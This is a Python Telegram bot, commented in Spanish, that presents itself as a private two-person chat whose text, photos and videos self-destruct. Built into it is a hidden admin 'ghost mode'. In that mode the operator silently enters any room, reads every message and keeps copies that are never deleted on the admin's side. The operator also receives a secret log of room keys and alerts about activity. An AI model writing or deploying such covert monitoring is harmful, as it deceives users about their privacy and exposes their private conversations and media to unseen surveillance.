import asyncio
import logging
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# --- CONFIGURACIÓN ---
TOKEN = 'TU_TOKEN_AQUI'
ADMIN_ID = 610413875 
# ---------------------

# ESTRUCTURAS DE MEMORIA (RAM)
rooms = {}             # Almacena salas: {"nombre": {"members": [ids], "pending": [mensajes]}}
user_to_room = {}      # Rastrea dónde está cada usuario: {user_id: "nombre_sala"}
waiting_for_key = set()# Usuarios que pulsaron "Entrar" y el bot espera que escriban la clave
monitor_active = {}    # Estado del monitor del admin: {admin_id: True/False}
offline_rooms_log = [] # Lista de salas creadas mientras el admin no estaba mirando

logging.basicConfig(level=logging.INFO)

# ETIQUETAS DE BOTONES
BTN_ENTRAR = '🔑 Entrar a Sala'
BTN_SALIR = '🚪 Salir de la Sala'
BTN_MONITOR = '🕵️ Monitor: ON/OFF'

# FUNCIÓN AUXILIAR: Borra un mensaje después de X segundos
async def delete_msg(context, chat_id, message_id, delay=0):
    if delay > 0: await asyncio.sleep(delay)
    try: await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except: pass # Si ya fue borrado, no hace nada

# COMANDO /START: Punto de entrada al bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Borra el comando /start escrito por el usuario para discreción
    asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
    
    # Crea el teclado principal
    kb = [[BTN_ENTRAR]]
    if user_id == ADMIN_ID: kb.append([BTN_MONITOR]) # Solo el admin ve el botón monitor
    
    markup = ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True)
    await update.message.reply_text("✨ **Modo Privado Listo**", reply_markup=markup)

# MANEJADOR DE TEXTO: Controla los botones y el flujo de entrada/salida
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    text = update.message.text

    # Lógica del BOTÓN MONITOR (Solo Admin)
    if text == BTN_MONITOR and user_id == ADMIN_ID:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        is_now_active = not monitor_active.get(user_id, False)
        monitor_active[user_id] = is_now_active # Cambia ON/OFF
        
        estado = "ON (Modo Fantasma)" if is_now_active else "OFF (Modo Usuario)"
        await update.message.reply_text(f"📡 Monitor: {estado}")
        
        # Si activas monitor, te muestra la lista acumulada de salas creadas en OFF
        if is_now_active and offline_rooms_log:
            reporte = "📂 **Salas creadas en OFF:**\n" + "\n".join([f"• `{r}`" for r in offline_rooms_log])
            await context.bot.send_message(chat_id=ADMIN_ID, text=reporte)
            offline_rooms_log.clear() # Limpia el registro tras informar
        return

    # Lógica del BOTÓN SALIR
    if text == BTN_SALIR:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        if user_id in user_to_room:
            room_name = user_to_room.pop(user_id) # Saca al usuario del rastreador
            if room_name in rooms and user_id in rooms[room_name].get("members", []):
                rooms[room_name]["members"].remove(user_id) # Saca al usuario de la sala
            
            # Restaura el menú principal
            kb = [[BTN_ENTRAR]]
            if user_id == ADMIN_ID: kb.append([BTN_MONITOR])
            markup = ReplyKeyboardMarkup(kb, resize_keyboard=True, is_persistent=True)
            await context.bot.send_message(chat_id=user_id, text="👋 Sesión finalizada.", reply_markup=markup)
        return

    # Lógica del BOTÓN ENTRAR (Inicia el proceso de clave)
    if text == BTN_ENTRAR:
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
        waiting_for_key.add(user_id) # Marca que este usuario va a escribir una clave
        msg = await update.message.reply_text("🔑 A qué sala deseas entrar?:", reply_markup=ReplyKeyboardRemove())
        asyncio.create_task(delete_msg(context, user_id, msg.message_id, 10))
        return

    # PROCESAR LA CLAVE ESCRITA
    if user_id in waiting_for_key:
        room_key = text
        waiting_for_key.remove(user_id) # Ya no estamos esperando clave
        asyncio.create_task(delete_msg(context, user_id, update.message.message_id)) # Borra la clave escrita
        
        # Si la sala no existe, se crea
        if room_key not in rooms:
            rooms[room_key] = {"members": [], "pending": []}
            # Si monitor OFF, guarda en log secreto. Si ON, avisa al admin.
            if not monitor_active.get(ADMIN_ID, False):
                if room_key not in offline_rooms_log: offline_rooms_log.append(room_key)
            else:
                await context.bot.send_message(chat_id=ADMIN_ID, text=f"📂 [NUEVA]: `{room_key}`")
        
        room = rooms[room_key]
        is_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))

        # Si no eres admin-fantasma, el bot te cuenta como miembro (máximo 2)
        if not is_ghost:
            if user_id not in room["members"] and len(room["members"]) >= 2:
                msg = await update.message.reply_text("🚫 Sala llena.")
                asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
                return
            if user_id not in room["members"]: room["members"].append(user_id)

        user_to_room[user_id] = room_key # Registra que ahora estás dentro de esa sala
        markup = ReplyKeyboardMarkup([[BTN_SALIR]], resize_keyboard=True, is_persistent=True)
        await update.message.reply_text("👻 Fantasma" if is_ghost else "🔓 Conectado", reply_markup=markup)

        # ENTREGA DE PENDIENTES: Al entrar, te da los mensajes que otros dejaron
        for item in list(room["pending"]):
            if is_ghost or item["sender"] != user_id:
                await deliver_content(context, user_id, item, room_key, is_ghost=is_ghost)
        return

    # SI NO ES UN BOTÓN Y ESTÁ EN UNA SALA: Trata el texto como un mensaje de chat
    if user_id in user_to_room:
        await process_message(update, context)

# PROCESAR MENSAJE: Recibe contenido (texto/foto/video) y decide a quién mandarlo
async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    room_name = user_to_room[user_id]
    room = rooms[room_name]
    is_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))
    
    # Borra el mensaje del emisor en 2s (efímero)
    asyncio.create_task(delete_msg(context, user_id, update.message.message_id, 2))
    
    if is_ghost: # El fantasma no puede hablar para no delatarse
        msg = await update.message.reply_text("⚠️ Solo lectura en modo fantasma.")
        asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
        return

    # Empaquetamos el contenido
    content_item = {"sender": user_id}
    if update.message.text: content_item.update({"type": "text", "content": update.message.text})
    elif update.message.photo: content_item.update({"type": "photo", "content": update.message.photo[-1].file_id})
    elif update.message.video: content_item.update({"type": "video", "content": update.message.video.file_id})
    else: return

    # Alertas al admin sobre la actividad
    if user_id != ADMIN_ID:
        msg_alert = f"🕵️ Actividad en: `{room_name}`" if monitor_active.get(ADMIN_ID, False) else "🔔 Actividad en sistema."
        await context.bot.send_message(chat_id=ADMIN_ID, text=msg_alert)

    # LÓGICA DE ENTREGA FLUIDA
    others = [m for m in room["members"] if m != user_id]
    
    if not others: # Si estás solo, se guarda para el futuro
        room["pending"].append(content_item)
    else:
        for m_id in others:
            # Si la otra persona está conectada actualmente en la misma sala...
            if user_to_room.get(m_id) == room_name:
                # SE ENTREGA EN TIEMPO REAL
                await deliver_content(context, m_id, content_item, room_name, is_ghost=False)
            else:
                # Si la persona es miembro pero salió de la sala, se guarda
                room["pending"].append(content_item)
                n_msg = await context.bot.send_message(chat_id=m_id, text="📩 Nuevo mensaje pendiente.")
                asyncio.create_task(delete_msg(context, m_id, n_msg.message_id, 5))

# ENTREGAR CONTENIDO: Envía el archivo/texto final y gestiona su borrado
async def deliver_content(context, chat_id, item, room_name, is_ghost=False):
    msg_type, content = item["type"], item["content"]
    try:
        # Envía según el tipo
        if msg_type == "text":
            sent = await context.bot.send_message(chat_id=chat_id, text=f"💬:\n{content}")
        elif msg_type == "photo":
            sent = await context.bot.send_photo(chat_id=chat_id, photo=content)
        elif msg_type == "video":
            sent = await context.bot.send_video(chat_id=chat_id, video=content)

        # REGLA DE AUTODESTRUCCIÓN
        # Si NO eres fantasma, el mensaje se borra de Telegram en 10s
        if not is_ghost:
            asyncio.create_task(delete_msg(context, chat_id, sent.message_id, 5))
            # Si el mensaje estaba en la lista de espera, se elimina ahora que se entregó
            if item in rooms[room_name].get("pending", []):
                rooms[room_name]["pending"].remove(item)
    except: pass # Evita caídas si el usuario bloqueó al bot

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, process_message))
    app.run_polling()